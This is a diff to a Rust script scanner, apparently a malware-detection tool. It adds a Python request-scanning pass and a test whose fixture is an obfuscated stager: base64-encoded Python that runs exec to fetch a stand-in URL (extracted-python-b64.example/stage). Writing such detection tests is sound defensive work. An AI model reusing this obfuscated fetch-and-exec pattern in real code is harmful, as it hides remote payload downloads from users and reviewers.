@@ -11918,6 +11918,7 @@ pub(crate) fn scan_extracted_script_text(deobfuscated: &str, env: &mut Environme
     scan_process_url_arguments(deobfuscated, env);
     scan_url_variable_assignments(deobfuscated, env);
     scan_powershell_concat_urls(deobfuscated, env);
+    scan_python_requests_get_deob_text(deobfuscated, env);
     scan_inline_b64_urls(deobfuscated, env);
     scan_registry_url_values(deobfuscated, env);
     scan_curl_deob_text(deobfuscated, env);
@@ -12130,6 +12131,28 @@ $links = @(($lfsdfsdg + 'bitbucket.example/downloads/test.jpg'),($lfsdfsdg + 'of
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn extracted_script_scan_decodes_python_base64_urlopen_payload() {
+        use base64::Engine;
+
+        let decoded = "import urllib.request;urllib.request.urlopen('https://extracted-python-b64.example/stage').read()";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let script = format!("import base64;exec(base64.b64decode('{b64}'))");
+        let mut env = Environment::new(&Config::default());
+
+        scan_extracted_script_text(&script, &mut env);
+
+        assert!(
+            env.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://extracted-python-b64.example/stage"
+            )),
+            "extracted Python Base64 URL was missed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
